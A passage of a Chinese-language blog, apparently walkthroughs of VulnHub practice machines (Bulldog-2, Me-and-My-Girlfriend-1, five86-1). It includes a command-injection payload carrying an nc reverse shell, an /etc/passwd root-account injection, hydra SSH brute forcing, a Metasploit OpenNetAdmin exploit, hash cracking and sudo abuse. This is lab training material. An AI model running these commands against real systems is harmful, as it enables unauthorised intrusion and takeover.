(&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p>在github上找到&quot;Bulldog-2-The-Reckoning&quot;的源码<br /><a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a></p><p>在<code>/router/users.js</code>中发现存在<code>exec</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">if (error) &#123;</span><br><span class="line">  console.error(&#96;exec error: $&#123;error&#125;&#96;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">console.log(&#96;stderr: $&#123;stderr&#125;&#96;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以在admin中的登入点实现命令注入</p><p>监听端口<br /><code>nc -lvvp 2020</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功接收Shell</p><h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2><p>查看文件<code>/etc/passwd</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;passwd</span><br><span class="line">    -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><code>/etc/passwd</code>可写</p><p>构造账户信息并写入<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su toor</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>JWT</p></blockquote><p>JWT提权时有些迷</p><ul><li>直接修改数据而不修改签名  提权成功</li><li>数据与签名都修改  提权成功</li><li>直接删掉签名部分  提权失败</li></ul><p>jwtcrack破解6位纯小写密码在虚拟机中大概需要3min。</p><p>参考资料</p><blockquote><p><a href="https://www.freebuf.com/vuls/219056.html">JWT</a><br /><a href="https://blog.csdn.net/zyy1659949090/article/details/88176215">/etc/passwd</a><br /><a href="https://blog.blacsheep.cn/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/">WP</a><br /><a href="https://www.anquanke.com/post/id/160755">WP</a></p></blockquote><hr /><h1 id="me-and-my-girlfriend-1"><a class="markdownIt-Anchor" href="#me-and-my-girlfriend-1"></a> <a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">Me-and-My-Girlfriend-1</a></h1><p><code>2020/03/04 13:23:34</code></p><h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.164</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)</span><br><span class="line">|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)</span><br><span class="line">|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)</span><br><span class="line">|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.002 days (since Wed Mar  4 00:21:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-8"><a class="markdownIt-Anchor" href="#web路径枚举-8"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F;                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294)</span><br></pre></td></tr></table></figure><ul><li>访问<code>/</code>： <code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></li><li>访问<code>robots.txt</code>：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><ul><li>访问<code>/heyhoo.txt</code>：<code>Great! What you need now is reconn, attack and got the shell</code></li></ul><h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2><p>使用hackbar进行操作<br />添加HTTP Header: <code>X-Forwarded-For: 0.0.0.0</code><br />请求<code>/</code>之后发现页面无变化，而浏览器路径变成<code>/?page=index</code><br />再次请求<code>/?page=index</code>，则显示正常页面</p><blockquote><p>个人推测是仿造IP请求<code>/</code>之后，触发302跳转至<code>?page=index</code>，而跳转之后的请求进行伪造IP，所以需要进行两步操作。包括之后的请求都要先点击链接，导入hackbar，在hackbar中请求。</p></blockquote><p>在register页面中注册一个用户<br />随后login<br />这两步推荐在BurpSuite中操作<br />HTTP Header加上<code>X-Forwarded-For: 0.0.0.0</code>即可</p><p>成功登入之后路径为<code>/index.php?page=dashboard&amp;user_id=12</code><br />而进入profile之后可以在源码中查看当前用户名与密码</p><p>更改user_id参数，即可未授权访问其他用户的profile页面<br />将所获取的账户与密码写入文件，再添加两个常用词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">eweuhtandingan</span><br><span class="line">skuyatuh</span><br><span class="line">aingmaung</span><br><span class="line">qwerty!!!</span><br><span class="line">sundatea</span><br><span class="line">indONEsia</span><br><span class="line">sedihaingmah</span><br><span class="line">cedihhihihi</span><br><span class="line">alice</span><br><span class="line">4lic3</span><br><span class="line">abdikasepak</span><br><span class="line">dorrrrr</span><br><span class="line">admin</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>利用hydra对SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L dic -P dic  -v -e ns ssh:&#x2F;&#x2F;192.168.31.164</span><br><span class="line">    [22][ssh] host: 192.168.31.164   login: alice   password: 4lic3</span><br></pre></td></tr></table></figure><p>成功获取账户</p><h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh alice@192.168.31.164</span><br><span class="line">    4lic3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>用sudo权限使用php来进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>密码共用</p></blockquote><p>值得一提的是，除了WEB服务中alice账户可以用于登入SSH服务之外，数据库的密码(<code>/var/www/html/config/config.php</code>)也是root用户的口令。进行靶机渗透时经常会出现这种状况，当获取到一些账户时，不妨试着在后台运行一下hydra。现实中这种情况也很常见，虽然理想状态下每个密码都足够复杂而且各不相同，但终将只是理想状态罢了。</p><blockquote><p>Mysql</p></blockquote><p>渗透过程中也尝试过针对user_id参数进行SQL注入，但是也没有进展，回过头想一下nmap扫描端口时并未发现Mysql服务。后来在网上看了一下，mysql可以设置为仅本地访问(localhost/127.0.0.1/0.0.0.0)。</p><blockquote><p>sudo</p></blockquote><p>之前对于<code>sudo</code>的理解还是不够透彻，仅仅单纯地以为sudo权限就是<code>sudo -i</code>直接提root，或者sudo接命令，片面地认为sudo权限是在账号层面上的。实则可以更为细化，如让账户可以以sudo权限执行某些命令。</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/ftl1012/p/sudo.html">sudo</a><br /><a href="http://www.freesion.com/article/4895226687/">wp</a><br /><a href="https://www.cnblogs.com/longyao/p/11719579.html">mysql</a></p></blockquote><hr /><h1 id="five86-1"><a class="markdownIt-Anchor" href="#five86-1"></a> <a href="https://www.vulnhub.com/entry/five86-1,417/">five86-1</a></h1><p><code>2020/03/08 18:20:27</code></p><h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.209</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;ona</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-9"><a class="markdownIt-Anchor" href="#web路径枚举-9"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.209/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461)                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><ul><li><code>/reports</code>路径需要进行basic认证</li><li>访问<code>/robots.txt</code>，得到如下内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;ona</span><br></pre></td></tr></table></figure><ul><li>路径<code>/ona</code>下运行的是&quot;opennetadmin v18.1.1&quot;</li><li>10000端口上的webmin服务需要账户</li></ul><h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2><ul><li>opennetadmin存在RCE漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh</span><br></pre></td></tr></table></figure><ul><li>webmin存在RCE漏洞但是需要提供账户</li></ul><p>在MSF中使用ona的RCE漏洞利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">set RHOST 192.168.31.209</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取shell</p><blockquote><p>当时MSF在kali源上的最新版本为5.0.76，而github上已更新到5.0.79，而且该RCE漏洞模块是在5.0.77版本加入MSF，所以需要手动将漏洞模块导入MSF，详情见下文</p></blockquote><h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2><p>查看文件<code>/var/www/html/reports/.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccess</span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Area&quot;</span><br><span class="line">AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswd</span><br><span class="line">require valid-user</span><br></pre></td></tr></table></figure><p>查看文件<code>/var/www/.htpasswd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;.htpasswd </span><br><span class="line"></span><br><span class="line">douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt</span><br></pre></td></tr></table></figure><p>得到账户douglas的密码hash与密码的相关信息</p><ul><li>由字符aefhrt组成</li><li>长度为十位</li></ul><p>将hash保存到本地<br /><code>echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd</code></p><p>使用crunch构造字典<br /><code>crunch 10 10 aefhrt -o pass</code></p><p>使用john爆破hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;pass --format&#x3D;md5crypt passwd</span><br><span class="line">john --show passwd</span><br><span class="line">    douglas:fatherrrrr</span><br></pre></td></tr></table></figure><p>使用douglas账户登入目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas:192.168.31.206</span><br><span class="line">fatherrrrr</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for douglas on five86-1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User douglas may run the following commands on five86-1:</span><br><span class="line">    (jen) NOPASSWD: &#x2F;bin&#x2F;cp</span><br></pre></td></tr></table></figure><p>可以以用户jen身份执行cp命令</p><p>生成ssh秘钥，拷贝至jen账户的home目录中，切换至账户jen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;</span><br><span class="line">cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keys</span><br><span class="line">sudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><p>登入信息中得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have new mail.</span><br></pre></td></tr></table></figure><p>查看邮件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;mail&#x2F;jen</span><br><span class="line"></span><br><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">(envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">id 1imZBc-0001FU-El</span><br><span class="line">for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br></pre></td></tr></table></figure><p>获得账户moss的密码</p><p>切换至账户moss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su moss</span><br><span class="line">Fire!Fire!</span><br></pre></td></tr></table></figure><p>在路径<code>/home/moss</code>下发现隐藏文件夹<code>.game</code><br />进入文件夹<code>.game</code>之后发现存在一个root权限的文件<code>upyourgame</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 2 moss moss  4096 Jan  1 03:53 .</span><br><span class="line">drwx------ 3 moss moss  4096 Jan  1 23:05 ..</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestar</span><br><span class="line">lrwxrwxrwx 1 moss moss    14 Jan  1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcd</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardier</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empire</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:23 freesweep -&gt; 